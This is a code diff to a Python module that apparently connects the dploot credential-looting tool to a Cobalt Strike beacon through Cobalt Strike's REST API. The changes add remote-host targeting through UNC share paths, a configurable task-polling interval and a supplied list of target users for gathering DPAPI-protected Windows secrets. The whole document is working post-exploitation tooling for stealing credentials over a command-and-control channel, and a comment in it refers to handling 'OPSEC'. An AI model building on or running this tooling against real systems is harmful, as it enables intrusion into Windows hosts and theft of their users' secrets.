@@ -22,8 +22,13 @@ class DPLoootCobaltStrikeConnection(DPLootConnection):
     def __prepare_path_and_share(self, path, share, isfile=True, double_escape=False):
         # Only for C$, we change the sharename for C:, to make the default dploot
         # work without touching the code to much.
-        if share == "C$":
-            share = "C:"
+        if self.target.remote_target is None:
+            # Doing local stuff
+            if share == "C$":
+                share = "C:"
+        else:
+            share = f"\\\\{self.target.remote_target}\\{share}"
+
 
         # Adapt path to be compatible with WMI Queries
         if isfile:
@@ -86,7 +91,7 @@ class DPLoootCobaltStrikeConnection(DPLootConnection):
         task_result = None
         
         while task_result is None:
-            sleep(2) # todo maybe set this as an option ?
+            sleep(self.target.wait) # todo maybe set this as an option ?
             res = requests.get(
                 url=f"{self.target.cs_api_url}/api/v1/tasks/{task_id}",
                 headers=self.headers,
@@ -94,12 +99,15 @@ class DPLoootCobaltStrikeConnection(DPLootConnection):
             )
 
             if res.status_code == 200:
+                if logging.getLogger().level == logging.DEBUG:
+                    print(res.json())
                 match res.json()["taskStatus"]:
                     case "COMPLETED":
                         logging.debug(f"Task ID {task_id} completed")
                         return res.json()["result"]
                     case "IN_PROGRESS":
                         logging.debug(f"Waiting for Task ID {task_id} result")
+                        continue
 
             if res.status_code == 404:
                 logging.debug(f"Still waiting for Task ID {task_id} to be launched")
@@ -152,7 +160,7 @@ class DPLoootCobaltStrikeConnection(DPLootConnection):
     def is_admin(self) -> bool:
         return True # :)
 
-    def list_dir(self, path, share="C:", wildcard=True) -> list[SharedFile]:
+    def list_dir(self, path, share="C$", wildcard=True) -> list[SharedFile]:
         path, share = self.__prepare_path_and_share(path=path, share=share)
         fullpath = f"{share}{path}"
         records = []
@@ -191,7 +199,7 @@ class DPLoootCobaltStrikeConnection(DPLootConnection):
     def read_file(
         self,
         path,
-        share = "C:",
+        share = "C$",
         looted_files=None,
         *args, **kwargs
     ) -> bytes:
@@ -231,6 +239,13 @@ class DPLoootCobaltStrikeConnection(DPLootConnection):
 
         return res.content
 
+    def list_users(self):
+        if len(self.target.target_users) > 0:
+            logging.info(f"Target usernames list supplied, we can skip listing the usernames.")
+            return self.target.target_users
+        directories = self.list_dir(path="Users")
+        return [d.get_longname() for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]
+
     def get_dpapi_system_keys(self, looted_files=None) -> Dict[str,bytes]:
         raise NotImplementedError(f"DPLoot won't handle the DPAPI SYSTEM keys recovery for Cobalt Strike collection, you handle the OPSEC. Once recovered, you can fill them with --dpapi-system-key on dploot machinemasterkeys.")
 
@@ -249,6 +264,9 @@ class CobaltStrikeTarget(Target):
         self.cs_api_url = None
         self.beacon_id = None
         self.beacon_note = None
+        self.remote_target = None
+        self.target_users = []
+        self.wait = 5
 
     @staticmethod
     def from_options(options) -> "Target":
@@ -258,6 +276,9 @@ class CobaltStrikeTarget(Target):
             cs_api_url=options.cs_api_url,
             beacon_id=options.beacon_id,
             beacon_note=options.beacon_note,
+            remote_target=options.remote_target,
+            target_users=options.target_users,
+            wait=options.wait,
         )
 
     @staticmethod
@@ -267,6 +288,9 @@ class CobaltStrikeTarget(Target):
         cs_api_url: str = "",
         beacon_id: Optional[str] = None,
         beacon_note: Optional[str] = None,
+        remote_target: Optional[str] = None,
+        target_users: List = [],
+        wait: int = 5,
     ) -> "Target":
         self = CobaltStrikeTarget()
         self.protocol = "cobaltstrike"
@@ -276,6 +300,9 @@ class CobaltStrikeTarget(Target):
         self.cs_api_url = cs_api_url
         self.beacon_id = beacon_id
         self.beacon_note = beacon_note
+        self.remote_target = remote_target
+        self.target_users = target_users
+        self.wait = wait
 
         self.address = self.cs_api_url
 
@@ -325,6 +352,31 @@ class CobaltStrikeTarget(Target):
             dest="beacon_note",
             action="store",
             help="Beacon note of the Beacon to use. If correspond to multiple beacon, will ask user through interactive selection",
+        )
+
+        group.add_argument(
+            "--target-host",
+            action="store",
+            dest="remote_target",
+            metavar="<target name or address>",
+            help="Target IP, FQDN or hostname. If empty, will target local computer",
+        )
+
+        group.add_argument(
+            "--wait",
+            metavar="seconds",
+            dest="wait",
+            action="store",
+            default=5,
+            help="When waiting for task to complete, to task status will be requested every X seconds. Default 5 seconds",
+        )
+
+        group.add_argument(
+            "--target-users",
+            nargs="*",
+            dest="target_users",
+            default=[],
+            help="Usernames to target as they are written in C:\\Users\\ directory. If supplied, will skip listing the usernames on the target",
         )
 
     def create_connection_object(self):
